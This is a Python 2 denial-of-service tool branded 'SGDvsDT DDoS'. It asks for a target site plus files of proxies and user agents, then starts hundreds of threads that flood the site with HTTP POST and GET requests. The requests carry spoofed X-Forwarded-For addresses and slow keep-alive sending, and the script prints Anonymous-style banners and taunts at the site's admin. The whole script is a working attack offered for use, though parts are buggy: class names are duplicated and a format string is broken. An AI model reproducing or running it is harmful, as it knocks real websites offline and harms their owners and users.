#!/usr/bin/env python
#coding: utf8
#Tool DDoS Proxy by SGDvsDT

import os
import string
import random
import socket
import threading
import time
import socks
from random import randrange
from threading import Thread

import terminal 
global term

term = terminal.TerminalController()

def randomIp():
    random.seed()
    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    return result
 
def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(2, 8)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
			
class httpPost(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.socks = socks.socksocket()
        self.running = True
               
    def _send_http_get(self, pause = 10):
        global stop_now
        self.socks.send("GET / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
                        "Accept: image/png,*/*;q=0.5\r\n"
                        "Cache-Control: no-cache, max-age=0\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 42\r\n\r\n" %
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                        (self.host, random.choice(zombie)))
                       
 
        for i in range(0, 99999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            data = ['\x00','\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00']
            packet = random.choice(data)
            bashbomb = ()
            magic = random.choice(packet+p+bashbomb)
            print term.BOL+term.UP+term.CLEAR_EOL+"Sending magic packets!: %s" % magic+term.NORMAL
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))
       
        self.socks.close()
			
class HttpPost(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.socks = socks.socksocket()
        self.running = True
       
    def _send_http_post(self, pause=10):
        global stop_now
 
        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                        (self.host, random.choice(zombie)))
 
        for i in range(0, 99999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            print term.BOL+term.UP+term.CLEAR_EOL+"Mk Team "'Enviando'" Bytes : %s" % p+term.NORMAL
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))
   
        self.socks.close() 
							
class HttpPost(threading.Thread):
    def run(self):
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
	useragent = "User-Agent: " + random.choice(zombie) + "\r\n"
	forward = "X-Forwarded-For: " + randomIpList() + "\r\n"
	referer   = "Referer: "+ random.choice(Bot) + url + "?r="+ str(random.randint(10000, 50000)) + "\r\n"
	httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
 
        while nload:
            time.sleep(0.5)
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(13):
                        a.send(httprequest)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')		 
				
#Main
os.system("color d")

print "LOADING CODE.....        "

print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(0.5)
print "[==========          ] 50%"
time.sleep(0.4)
print "[===============     ] 75%"
time.sleep(0.35)
print "[====================] 100%"
time.sleep(0.2) 

print '----------------------------------------------------------------------'
print '|                       WELCOME TO MY TOOL DDoS =D                    ' 
print '----------------------------------------------------------------------'
print \
"""	      ___________________________________________________ 
            /                                                   \
           |    _____________________________________________    |
           |   |                                             |   |
           |   |                                             |   |
           |   | root@onion.land:~# We are Anonymous.        |   |
           |   | root@onion.land:~# We are Legion.           |   |
           |   | root@onion.land:~# We do not forgive.       |   |	
           |   | root@onion.land:~# We do not forget.        |   |
           |   | root@onion.land:~# Expect us.               |   |
           |   |                                             |   |
           |   |                                             |   |
           |   |                                             |   |
           |   |                                             |   |
           |   |                                             |   |
           |   |                                             |   |
           |   |_____________________________________________|   |
           |                                                     |
            \____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'
"""
print '---------------------------------------------------'

print '...........:::::>SDGvsDT DDoS v. 22.0 <:::::.......'

print '---------------------------------------------------'
# Site
url = raw_input(">Site: ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
#Zombie
in_file = open(raw_input(">Zombie: "),"r")
zombie = in_file.read()
#Bot
in_file = open(raw_input(">Bot: "),"r")
Bot = in_file.read()
#Proxy
in_file = open(raw_input(">Proxy: "),"r")
proxyf = in_file.read()
in_file.close()
listaproxy = proxyf.split('\n')
#Dame
thread = input(">DAME(750): ")
#Attack
#####################################################################################
get_host = "POST " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"                #
accept = "Accept-Encoding: gzip, deflate\r\n"                                       #
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"  #
#####################################################################################
nload = 1
x = 0

for x in xrange(thread):
		HttpPost().start()
		time.sleep(0.0000000000000000000001)
		print ('Attacking 65500 request to [ ' + url + ' ] on port : [80]')
		
#for x in progressbar(range(thread), 'Nap: ', 60):
    #attacco1().start()
    #time.sleep(0.003)	
	
#for x in xrange(int(thread + 1)):
		#attacco2().start()
		#time.sleep(0.0000000000000000000001)
		#print ('Attacking 65500 request to [ ' + url + ' ] on port : [80]')

print '---------------------------------------------------------- '	
print " ------------>>>>>DoS Attack WebSite<<<<<----------------- "
print "------------>>>>>    Die Website    <<<<<----------------- "                  
print "   ------------>>>>>Tool By SGDvsDT <<<<<----------------- "
print '---------------------------------------------------------- '
print '---------------------------------------------------------- '
print "   ,_______________________.~"
print "   !       SGDvsDT       !0!  ~ --ATTACK-- ==> 'Fuck you Admin !!!'1000000000000000000000000000000000000000000000000rq/s'"
print "   !---> ________________! !~"
print "   !     _____===========!_!"
print "   /     /__/"
print "  / Zom /"
print " / Bie /"
print "/_____/"
	#time.sleep(2)
	#sent = sent + 1
	#print " Send %s packet to victim throught port %s" %(sent,port)
print '---------------------------------------------------------- '
print "Ctrl + C or Ctrl + Z to stop code ..."
print '---------------------------------------------------------- '
nload = 0
while not nload:
	time.sleep(1)
